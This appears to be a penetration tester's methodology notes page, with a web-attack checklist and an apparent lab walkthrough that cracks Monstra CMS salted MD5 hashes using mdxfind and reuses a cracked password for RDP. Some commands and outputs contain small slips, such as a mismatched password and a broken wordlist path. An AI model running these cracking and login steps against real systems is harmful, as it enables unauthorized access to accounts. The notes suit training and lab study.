---
title: "methodology"
weight: 2
---
&nbsp;

- Manual code inspection
- Directory Fuzzy
- File fuzzy including extension fuzzing
- birtua host fuzzing
- apache version?

- Version checking using such split and Google
- login with default creds
- Parameters which will open the gates for local file inclusions or remote file inclusions
- Trying sequel characters to get an error on the login pages
- If its api try os command injection
- Brute force the web application if there is no hint of users use cedwl to create a user name word list and try it with rock cube
- If you get the domain try fuzzing virtual hosts
- look out for backups

&nbsp;

&nbsp;cracking passwords

We don't receive a clear answer but it looks like it's probably some hashing combination involving MD5. We can use the tool `mdxfind` to help us determine how these password hashes were created. We can download a binary from [here](https://www.techsolvency.com/pub/bin/mdxfind/).

```
┌──(███㉿███)-[~]
└─$ wget https://www.techsolvency.com/pub/bin/mdxfind/mdxfind.static -O mdxfind

┌──(███㉿███)-[~]
└─$ chmod +x mdxfind
```

Before we can run `mdxfind`, we will need to figure out the salt value used by Monstra CMS and we will need a hash that we know what the original password was. After some web searching, we find [this blog](https://simpleinfoseccom.wordpress.com/2018/05/27/monstra-cms-3-0-4-unauthenticated-user-credential-exposure/) which claims that the salt can very likely be the default value of "YOUR_SALT_HERE". Let's write this to a file for use later.

```
┌──(███㉿███)-[~]
└─$ echo "YOUR_SALT_HERE" > salt.txt
```

As for the known hash, we can simply use the hash of the admin user because we know the password is "wazkowski". Let's create a password file with only that password for `mdxfind` to use.

```
┌──(███㉿███)-[~]
└─$ echo "wazkowski" > pass.txt
```

We now need to pass the admin password hash into `mdxfind` using stdin and specify MD5 hashing, our salt and pass files, and we can attempt to try 5 iterations.

```
┌──(███㉿███)-[~]
└─$ echo "a2b4e80cd640aaa6e417febe095dcbfc" | ./mdxfind -h 'MD5' -s salt.txt pass.txt -i 5
1 salts read from salt.txt
Iterations set to 5
...
1 total salts in use
Generated 19998 Userids
Reading hash list from stdin...
Took 0.00 seconds to read hashes
Searching through 1 unique hashes from <STDIN>
Maximum hash chain depth is 1
Minimum hash length is 32 characters
Using 4 cores
MD5PASSSALTx02 a2b4e80cd640aaa6e417febe095dcbfc:YOUR_SALT_HERE:wazowski

Done - 4 threads caught
1 lines processed in 0 seconds
1.00 lines per second
0.10 seconds hashing, 2,027,998 total hash calculations
20.33M hashes per second (approx)
1 total files
1 MD5PASSSALTx02 hashes found
1 Total hashes found
```

The command completes quickly and we now know that these hashes are created with 2 rounds of MD5 with our assumed salt value of "YOUR_SALT_HERE". With this information, we can now use `mdxfind` again to attempt to crack the password hash for the "mike" user. Let's run the same command but swap in mike's hash, specify the hash type, supply the rockyou wordlist, and switch it to 2 iterations.

```
┌──(███㉿███)-[~]
└─$ echo "844ffc2c7150b93c4133a6ff2e1a2dba" | ./mdxfind -h 'MD5PASSSALT' -s salt.txt /usr/sharewordlists/rockyou.txt -i 2
1 salts read from salt.txt
Iterations set to 2
Working on hash types: MD5PASSSALT SHA1revMD5PASSSALT SHA1MD5PASSSALT MD5-SALTMD5PASSSALT 
1 total salts in use
Reading hash list from stdin...
Took 0.00 seconds to read hashes
Searching through 1 unique hashes from <STDIN>
Maximum hash chain depth is 1
Minimum hash length is 32 characters
Using 4 cores
MD5PASSSALTx02 844ffc2c7150b93c4133a6ff2e1a2dba:YOUR_SALT_HERE:Mike14

Done - 4 threads caught
14,344,392 lines processed in 6 seconds
2390732.00 lines per second
5.83 seconds hashing, 143,443,920 total hash calculations
24.59M hashes per second (approx)
1 total files
1 MD5PASSSALTx02 hashes found
1 Total hashes found
```

We have cracked mike's password. Maybe Mike uses the same password for RDP. Let's give it a shot.

```
┌──(███㉿███)-[~]
└─$ xfreerdp /cert-ignore /u:mike /p:Mike14 /v:192.168.120.156
```